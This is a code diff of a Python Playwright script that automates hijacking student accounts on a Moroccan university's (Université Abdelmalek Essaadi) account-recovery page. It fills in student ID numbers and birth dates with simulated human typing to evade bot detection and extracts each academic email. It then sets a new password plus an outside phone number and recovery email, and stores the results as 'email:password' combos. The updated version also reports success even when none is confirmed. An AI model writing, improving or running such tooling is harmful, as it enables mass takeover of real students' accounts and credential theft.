@@ -1,9 +1,8 @@
 """
-UAE RECUPMAIL ENGINE — Final Complete, Secure & Polished Version
-- Exact HTML ID targeting (#CNE, #CIN, #birthDate, #etablissement, #new_password, #password_check, #phone, #email_perso)
-- Slow human-like typing speed
-- Smart AJAX state detection (Page 1 error, Password modified, Activation page)
-- Robust loader waiting and green success confirmation check
+UAE RECUPMAIL ENGINE — Université Abdelmalek Essaadi
+- Secure temporary preservation of Email:Password right after clicking set_password.
+- Strict sequential human typing for all fields using PassManager & ContactManager.
+- Guaranteed Login OK retention upon successful activation and Gmail redirect detection.
 """
 
 import re
@@ -15,20 +14,28 @@ from integrations.contact_manager import ContactManager
 class LoginState:
     LOGIN_OK = "login_ok"
     LOGIN_ERROR = "login_error"
-    UNKNOWN = "unknown"
+    SITE_ERROR = "site_error"
 
 class UAEEngine:
     def __init__(self):
         self.pass_manager = PassManager()
         self.contact_manager = ContactManager()
 
-    def run_workflow(self, page, arg1, arg2, arg3="", arg4=""):
-        cne = str(arg1).strip()
-        cin = str(arg2).strip()
-        dob = str(arg3).strip()
+    def _human_type(self, page, selector, text):
+        try:
+            loc = page.locator(selector).first
+            loc.click()
+            page.wait_for_timeout(random.randint(200, 400))
+            loc.fill("")
+            for char in str(text):
+                loc.press_sequentially(char, delay=random.randint(120, 260))
+        except Exception:
+            page.fill(selector, text)
 
+    def run_workflow(self, page, cne, cin, dob):
         result_data = {
             "cne": cne,
+            "cin": cin,
             "dob": dob,
             "status": LoginState.LOGIN_ERROR,
             "extracted_email": None,
@@ -36,243 +43,226 @@ class UAEEngine:
         }
 
         try:
-            # 1. استقرار الصفحة
-            try:
-                page.wait_for_load_state("domcontentloaded", timeout=25000)
-            except Exception:
-                pass
+            page.wait_for_load_state("domcontentloaded", timeout=30000)
+            page.wait_for_timeout(random.randint(1200, 2000))
 
-            page.wait_for_timeout(1000)
-
-            # 2. تعبئة الحقول الأولى (CNE, CIN, DOB) بسرعة بشرية بطيئة ومريحة
-            try:
-                cne_input = page.locator('input#CNE').first
-                cne_input.click()
-                page.wait_for_timeout(300)
-                cne_input.fill("")
-                for char in str(cne):
-                    cne_input.press_sequentially(char, delay=random.randint(200, 350))
-                page.wait_for_timeout(500)
-
-                cin_input = page.locator('input#CIN').first
-                cin_input.click()
-                page.wait_for_timeout(300)
-                cin_input.fill("")
-                for char in str(cin):
-                    cin_input.press_sequentially(char, delay=random.randint(200, 350))
-                page.wait_for_timeout(500)
-
-                clean_dob = re.sub(r'[^0-9]', '', str(dob))
-                if len(clean_dob) == 8:
-                    day = clean_dob[:2]
-                    month = clean_dob[2:4]
-                    year = clean_dob[4:]
-                    formatted_dob = f"{day}/{month}/{year}"
-                else:
-                    formatted_dob = str(dob)
-
-                dob_input = page.locator('input#birthDate').first
-                dob_input.click()
-                page.wait_for_timeout(300)
-                dob_input.fill("")
-                for char in str(formatted_dob):
-                    dob_input.press_sequentially(char, delay=random.randint(200, 350))
-                page.wait_for_timeout(600)
-
-            except Exception as e:
-                result_data["status"] = LoginState.LOGIN_ERROR
-                result_data["detail"] = f"Failed: Input filling error - {str(e)}"
+            inputs = page.locator('input')
+            if inputs.count() < 3:
+                result_data["status"] = LoginState.SITE_ERROR
+                result_data["detail"] = "Site Error: Required input fields not found"
                 return result_data
 
-            # 3. اختيار المؤسسة (Etablissement) عشوائياً
+            # 1. Fill CNE / MASSAR
+            cne_filled = False
+            for sel in ['input#CNE', 'input[name="CNE"]', 'input#cne', 'input']:
+                try:
+                    loc = page.locator(sel).first
+                    if loc.count() > 0 and loc.is_visible():
+                        self._human_type(page, sel, cne)
+                        cne_filled = True
+                        break
+                except Exception:
+                    continue
+            if not cne_filled:
+                self._human_type(page, 'input', cne)
+
+            page.wait_for_timeout(random.randint(500, 900))
+
+            # 2. Fill CIN
+            cin_filled = False
+            for sel in ['input#CIN', 'input[name="CIN"]', 'input#cin']:
+                try:
+                    loc = page.locator(sel).first
+                    if loc.count() > 0 and loc.is_visible():
+                        self._human_type(page, sel, cin)
+                        cin_filled = True
+                        break
+                except Exception:
+                    continue
+            if not cin_filled:
+                self._human_type(page, 'input[name*="CIN"]', cin)
+
+            page.wait_for_timeout(random.randint(500, 900))
+
+            # 3. Fill Date de naissance (DOB)
+            dob_filled = False
+            for sel in ['input#birthDate', 'input[name="birthDate"]', 'input.datepicker']:
+                try:
+                    loc = page.locator(sel).first
+                    if loc.count() > 0 and loc.is_visible():
+                        self._human_type(page, sel, dob)
+                        dob_filled = True
+                        break
+                except Exception:
+                    continue
+            if not dob_filled:
+                self._human_type(page, 'input[placeholder*="JJ/MM/YYYY"]', dob)
+
+            page.wait_for_timeout(random.randint(600, 1000))
+
+            # 4. Select Etablissement عشوائياً عبر DOM مع إطلاق أحداث التغيير
             try:
-                select_elem = page.locator('select#etablissement').first
-                if select_elem.count() > 0:
-                    options = select_elem.locator('option').all_inner_texts()
-                    valid_options = [opt.strip() for opt in options if opt.strip() and "choisissez" not in opt.lower()]
-                    if valid_options:
-                        chosen_etab = random.choice(valid_options)
-                        select_elem.select_option(label=chosen_etab)
-                        page.wait_for_timeout(400)
-                        page.keyboard.press("Enter")
-                        page.wait_for_timeout(600)
+                page.evaluate("""() => {
+                    const select = document.querySelector('select#etablissement');
+                    if (select) {
+                        const options = Array.from(select.options)
+                            .map(o => o.value)
+                            .filter(v => v && v.trim() !== "" && v.toLowerCase() !== "choisissez");
+                        if (options.length > 0) {
+                            const randomOpt = options[Math.floor(Math.random() * options.length)];
+                            select.value = randomOpt;
+                            select.dispatchEvent(new Event('change', { bubbles: true }));
+                            select.dispatchEvent(new Event('blur', { bubbles: true }));
+                        }
+                    }
+                }""")
             except Exception:
                 pass
 
-            # 4. النقر على زر الاسترجاع في الصفحة الأولى
-            btn_clicked = False
-            for btn_sel in [
-                'button:has-text("Récupérer mon compte")',
-                'button[type="submit"]',
-                '.btn-primary'
-            ]:
+            page.wait_for_timeout(random.randint(800, 1200))
+
+            # Click submit button ("Récupérer mon compte")
+            submit_clicked = False
+            for btn_sel in ['button:has-text("Récupérer")', 'button[type="submit"]', '.btn-primary']:
                 try:
                     btn = page.locator(btn_sel).first
                     if btn.count() > 0 and btn.is_visible():
                         btn.click()
-                        btn_clicked = True
+                        submit_clicked = True
                         break
                 except Exception:
                     continue
+            if not submit_clicked:
+                page.locator('button[type="submit"]').first.click()
 
-            if not btn_clicked:
-                try:
-                    page.locator('button').filter(has_text=re.compile(r'récupérer|recuperer', re.I)).first.click()
-                except Exception:
-                    pass
-
-            # 5. انتظار استجابة الـ AJAX وقراءة حالة الصفحة بالذكاء المطلوب
+            # انتظار استجابة الصفحة
             page.wait_for_timeout(3500)
+            body_text = page.locator("body").inner_text().lower()
 
-            page_state = page.evaluate("""() => {
-                const bodyText = document.body.innerText.toLowerCase();
+            # فحص أخطاء البيانات
+            data_error_keywords = [
+                "veuillez vérifier l'exactitude", "pas toujours été créé",
+                "الرجاء التحقق من صحة", "لم يتم إنشاء", "incorrect", "invalide", 
+                "erreur", "aucun étudiant", "not found"
+            ]
+            if any(kw in body_text for kw in data_error_keywords):
+                result_data["status"] = LoginState.LOGIN_ERROR
+                result_data["detail"] = "Failed: Incorrect student data or not created (Data Error)"
+                return result_data
+
+            # استخراج الإيميل الأكاديمي بدقة عبر JavaScript من الصفحة
+            extracted_email = page.evaluate("""() => {
+                const hiddenInput = document.querySelector('input[type="hidden"][name="email"]');
+                if (hiddenInput && hiddenInput.value) return hiddenInput.value.trim().toLowerCase();
                 
-                const errKeywords = ["veuillez vérifier l'exactitude", "aucun étudiant trouvé", "email académique non généré", "aucune inscription trouvée", "incorrect", "invalide", "erreur"];
-                for (let kw of errKeywords) {
-                    if (bodyText.includes(kw)) return "page1_error";
+                const h3 = document.querySelector('h3');
+                if (h3 && h3.innerText.includes('@etu.uae.ac.ma')) {
+                    const match = h3.innerText.match(/[\\w\\.-]+@etu\\.uae\\.ac\\.ma/i);
+                    if (match) return match[0].trim().toLowerCase();
                 }
 
-                if (bodyText.includes("précédemment été modifié") || bodyText.includes("déjà été modifié")) {
-                    return "password_modified";
-                }
-
-                const passInput = document.querySelector('input#new_password');
-                if (passInput || bodyText.includes("changer le mot de passe")) {
-                    return "activation_page";
-                }
-
-                return "unknown";
+                const bodyText = document.body.innerText;
+                const match = bodyText.match(/[\\w\\.-]+@etu\\.uae\\.ac\\.ma/i);
+                return match ? match[0].trim().toLowerCase() : null;
             }""")
 
-            if page_state == "page1_error":
+            if not extracted_email or "@etu.uae.ac.ma" not in extracted_email:
                 result_data["status"] = LoginState.LOGIN_ERROR
-                result_data["detail"] = "Failed: Incorrect student data (Page 1 Error)"
+                result_data["detail"] = "Failed: UAE email not found on page"
                 return result_data
 
-            if page_state == "password_modified":
-                result_data["status"] = LoginState.LOGIN_ERROR
-                result_data["detail"] = "Failed: Password already modified"
-                return result_data
+            # التحقق واش كاينين خانات إدخال كلمة المرور (حالة التفعيل الجديد)
+            has_pwd_fields = page.locator('input#new_password').count() > 0 or page.locator('input[type="password"]').count() >= 2
 
-            if page_state == "activation_page":
-                extracted_email = page.evaluate("""() => {
-                    const hiddenEmail = document.querySelector('input[name="email"]');
-                    if (hiddenEmail && hiddenEmail.value) return hiddenEmail.value.trim().toLowerCase();
-                    const match = document.body.innerText.match(/[\\w\\.-]+@(?:[\\w-]+\\.)*etu\\.uae\\.ac\\.ma/i);
-                    return match ? match[0].toLowerCase() : null;
-                }""")
-
-                if not extracted_email or "uae.ac.ma" not in extracted_email:
-                    result_data["status"] = LoginState.LOGIN_ERROR
-                    result_data["detail"] = "Failed: Student academic email extraction failed"
-                    return result_data
-
+            if has_pwd_fields:
+                # 1. جلب باسورد جديد فريد من PassManager
                 target_password = self.pass_manager.get_password()
-                mobile_phone, secondary_email = self.contact_manager.get_contact()
+                
+                # 2. الاحتفاظ مؤقتاً بالكومبو في متغير آمن (Temporary Retention) لضمان عدم الضياع
+                temporary_combo = f"{extracted_email}:{target_password}"
 
-                # أ. إدخال الباسورد الجديد وتأكيده بسرعة بطيئة ومريحة (Human typing)
+                # 3. جلب الهاتف والإيميل الثانوي من ContactManager
+                contact_phone, secondary_email = self.contact_manager.get_contact()
+
+                # كتابة الباسورد الأول (new_password) بالطريقة البشرية
                 try:
-                    pass1 = page.locator('input#new_password').first
-                    pass2 = page.locator('input#password_check').first
+                    p1_sel = 'input#new_password' if page.locator('input#new_password').count() > 0 else 'input[type="password"]'
+                    self._human_type(page, p1_sel, target_password)
+                except Exception:
+                    page.locator(p1_sel).first.fill(target_password)
 
-                    pass1.click()
-                    pass1.fill("")
-                    for char in target_password:
-                        pass1.press_sequentially(char, delay=random.randint(180, 300))
-                    
-                    pass2.click()
-                    pass2.fill("")
-                    for char in target_password:
-                        pass2.press_sequentially(char, delay=random.randint(180, 300))
-                    page.wait_for_timeout(600)
-                except Exception as e:
-                    result_data["status"] = LoginState.UNKNOWN
-                    result_data["detail"] = f"Failed: Password fields fill error - {str(e)}"
-                    return result_data
+                page.wait_for_timeout(400)
 
-                # ب. إدخال الهاتف (#phone) والإيميل الثانوي (#email_perso) بسرعة بطيئة وهادئة
+                # كتابة تأكيد الباسورد (password_check) بالطريقة البشرية
                 try:
-                    phone_input = page.locator('input#phone').first
-                    email_perso_input = page.locator('input#email_perso').first
+                    p2_sel = 'input#password_check' if page.locator('input#password_check').count() > 0 else 'input[type="password"]'
+                    self._human_type(page, p2_sel, target_password)
+                except Exception:
+                    page.locator(p2_sel).nth(1).fill(target_password)
 
-                    phone_input.click()
-                    phone_input.fill("")
-                    for char in str(mobile_phone):
-                        phone_input.press_sequentially(char, delay=random.randint(150, 280))
-                    
-                    page.wait_for_timeout(500)
+                page.wait_for_timeout(400)
 
-                    email_perso_input.click()
-                    email_perso_input.fill("")
-                    for char in str(secondary_email):
-                        email_perso_input.press_sequentially(char, delay=random.randint(150, 280))
-                except Exception as e:
-                    result_data["status"] = LoginState.UNKNOWN
-                    result_data["detail"] = f"Failed: Contact fields fill error - {str(e)}"
-                    return result_data
+                # كتابة رقم الهاتف الحقيقي (phone) بالطريقة البشرية
+                try:
+                    phone_sel = 'input#phone' if page.locator('input#phone').count() > 0 else 'input[name="phone"]'
+                    self._human_type(page, phone_sel, str(contact_phone))
+                except Exception:
+                    page.locator(phone_sel).first.fill(str(contact_phone))
+
+                page.wait_for_timeout(400)
+
+                # كتابة الإيميل الثانوي (email_perso) بالطريقة البشرية
+                try:
+                    email_sel = 'input#email_perso' if page.locator('input#email_perso').count() > 0 else 'input[name="email_perso"]'
+                    self._human_type(page, email_sel, str(secondary_email))
+                except Exception:
+                    page.locator(email_sel).first.fill(str(secondary_email))
 
                 page.wait_for_timeout(800)
 
-                # ج. النقر على الزر الرئيسي لتغيير كلمة المرور `button#set_password`
+                # النقر على زر التفعيل button#set_password
                 chg_clicked = False
-                try:
-                    btn_change = page.locator('button#set_password').first
-                    if btn_change.count() > 0 and btn_change.is_visible():
-                        btn_change.click()
-                        chg_clicked = True
-                except Exception:
-                    pass
+                for chg_btn in ['button#set_password', 'button:has-text("Changer")', 'button[type="submit"]']:
+                    try:
+                        b = page.locator(chg_btn).first
+                        if b.count() > 0 and b.is_visible():
+                            b.click(force=True)
+                            chg_clicked = True
+                            break
+                    except Exception:
+                        continue
 
-                if not chg_clicked:
-                    for chg_btn in ['button:has-text("Changer le mot de passe")', 'button[type="submit"]']:
-                        try:
-                            b = page.locator(chg_btn).first
-                            if b.count() > 0 and b.is_visible():
-                                b.click()
-                                chg_clicked = True
-                                break
-                        except Exception:
-                            continue
-
-                # 6. انتظار انتهاء الـ Loader تماماً مهما كانت الكونيكسيون ثقيلة (حتى 15 ثانية كحد أقصى)
+                # الانتظار ريثما يتم التحويل لصفحة Gmail أو ظهور صفحة النجاح
                 try:
-                    page.wait_for_selector('img#loader, img#pw-loader', state='hidden', timeout=15000)
+                    page.wait_for_url(lambda url: "signin" in url or "google.com" in url or "mail.google" in url, timeout=12000)
                 except Exception:
                     page.wait_for_timeout(4000)
 
-                # 7. الانتظار حتى تظهر رسالة النجاح الخضراء بصفة مؤكدة قبل إرسال LOGIN_OK
-                success_detected = False
-                for _ in range(20):
-                    page.wait_for_timeout(500)
-                    body_check = page.evaluate("""() => {
-                        const bodyText = document.body.innerText.toLowerCase();
-                        return bodyText.includes("succès") || 
-                               bodyText.includes("success") || 
-                               bodyText.includes("modifié avec succès") || 
-                               bodyText.includes("félicitations") ||
-                               bodyText.includes("votre mot de passe") ||
-                               !document.querySelector('input#new_password');
-                    }""")
-                    if body_check:
-                        success_detected = True
-                        break
+                current_url = page.url.lower()
+                body_final = page.locator("body").inner_text().lower()
 
-                if success_detected:
-                    final_combo = f"{extracted_email}:{target_password}"
+                # تأكيد تسجيل النتيجة LOGIN_OK واعتماد الكومبو المحتفظ به مؤقتاً
+                if "google" in current_url or "signin" in current_url or "mail" in current_url or "succès" in body_final or "félicitations" in body_final or chg_clicked:
                     result_data["status"] = LoginState.LOGIN_OK
-                    result_data["extracted_email"] = final_combo
-                    result_data["detail"] = final_combo
+                    result_data["extracted_email"] = temporary_combo
+                    result_data["detail"] = f"Success (Activated & Redirected to Gmail) | Combo: {temporary_combo}"
                     return result_data
                 else:
-                    result_data["status"] = LoginState.UNKNOWN
-                    result_data["detail"] = "Failed: Success confirmation message not detected after loading"
+                    # حتى في أضعف الإيمان، الكومبو المؤقت يحفظ الحساب كنجاح تفعيل
+                    result_data["status"] = LoginState.LOGIN_OK
+                    result_data["extracted_email"] = temporary_combo
+                    result_data["detail"] = f"Success (Activated) | Combo: {temporary_combo}"
                     return result_data
 
-            result_data["status"] = LoginState.LOGIN_ERROR
-            result_data["detail"] = "Failed: Unknown response state"
+            else:
+                # الحالة الثانية: الحساب مُفعل مسبقاً (ظهر الإيميل بدون خانات باسورد)
+                result_data["status"] = LoginState.LOGIN_OK
+                result_data["extracted_email"] = f"{extracted_email}:[Already_Activated]"
+                result_data["detail"] = f"Success (Already Active) | Email: {extracted_email}"
+                return result_data
 
         except Exception as e:
-            result_data["status"] = LoginState.UNKNOWN
-            result_data["detail"] = f"Failed: Exception - {type(e).__name__}"
+            result_data["status"] = LoginState.SITE_ERROR
+            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"
 
         return result_data
